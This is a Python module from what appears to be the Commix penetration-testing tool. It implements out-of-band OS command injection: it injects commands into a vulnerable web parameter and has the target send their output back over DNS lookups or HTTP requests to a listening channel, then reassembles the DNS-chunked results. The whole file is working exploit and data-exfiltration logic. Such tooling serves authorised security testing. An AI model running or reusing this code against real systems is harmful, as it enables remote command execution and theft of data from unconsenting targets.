#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import time

from src.utils import settings
from src.core.controller import handler
from src.core.controller import checks
from src.core.techniques.oob import oob_payloads as payloads

"""
The out-of-band technique on OS command injection.
"""

"""
Run a command on the target and read its output back off the out-of-band channel.
"""
def injection(separator, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, transport=None):
  channel = settings.OOB_CHANNEL
  transport = transport or settings.OOB_TRANSPORT
  if channel is None or not payloads.supports_exfiltration(transport):
    return ""

  # A name lookup gets a second go: the output rides in the query name, and a resolver that
  # normalises the name away before forwarding it leaves the interaction without the data.
  attempts = settings.OOB_DNS_ATTEMPTS if transport == "dns" else 1
  for attempt in range(attempts):
    token, hostname = channel.new_payload()
    if settings.OOB_EVAL:
      payload = payloads.exfiltrate_eval(separator, transport, hostname, cmd)
    else:
      payload = payloads.exfiltrate(separator, transport, hostname, cmd)
    try:
      handler.oob_inject(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
    except Exception:
      return ""

    if transport == "dns":
      output = _dns_output(channel, token)
      if output or attempt + 1 == attempts:
        return output
      continue

    for interaction in channel.wait_for(token, settings.OOB_TIMEOUT, protocol="http"):
      body = checks.oob_request_body(interaction.raw_request)
      if body:
        return body.rstrip("\r\n")
    return ""
  return ""

"""
Collect the numbered chunks a 'dns' payload asked to be resolved, waiting for the last of them
rather than answering on the first - each carries only a part of the output.
"""
def _dns_output(channel, token):
  chunks = {}
  total = None
  # A lookup travels through the target's own resolver before it reaches the server, so the
  # chunks arrive later than a probe's single interaction does - and every one of them is needed.
  deadline = time.time() + settings.OOB_TIMEOUT * 2
  """
  Only a chain that a statement separator lets carry a loop can count its own chunks and say so in
  every label. The chain built for the other separators numbers them without a total, so quiet time
  stands in for one: once a poll brings nothing new, what arrived is what there is. Waiting on a
  total that is never coming spent the whole timeout on every retrieval, however early it finished.
  """
  quiet_polls = 0
  channel.poll_now()
  while True:
    seen_before = len(chunks)
    for interaction in channel.seen(token, protocol="dns"):
      labels = channel.data_of(interaction)
      if len(labels) < 2:
        continue
      index, _, count = labels[0].partition("-")
      if not index.isdigit():
        continue
      if count.isdigit():
        total = int(count)
      chunks[int(index)] = "".join(labels[1:])
    if total is not None and len(chunks) >= total:
      break
    if total is None and chunks:
      quiet_polls = quiet_polls + 1 if len(chunks) == seen_before else 0
      if quiet_polls >= 2:
        break
    if time.time() >= deadline:
      if total is not None and len(chunks) < total:
        settings.INCOMPLETE_OUTPUT = True
      break
    channel.poll_now()
    time.sleep(2)
  # Numbered from one and unbroken, or some of what was sent never arrived. This is the only thing
  # that can say so where no total came with the labels.
  if chunks and sorted(chunks) != list(range(1, len(chunks) + 1)):
    settings.INCOMPLETE_OUTPUT = True
  # The command's trailing newline came through the labels, dropped here as the HTTP branch does.
  return payloads.decode_dns_output(chunks).rstrip("\r\n")

"""
Report whether the channel can carry command output back.
"""
def can_execute():
  return settings.OOB_CHANNEL is not None and payloads.supports_exfiltration(settings.OOB_TRANSPORT)

# eof
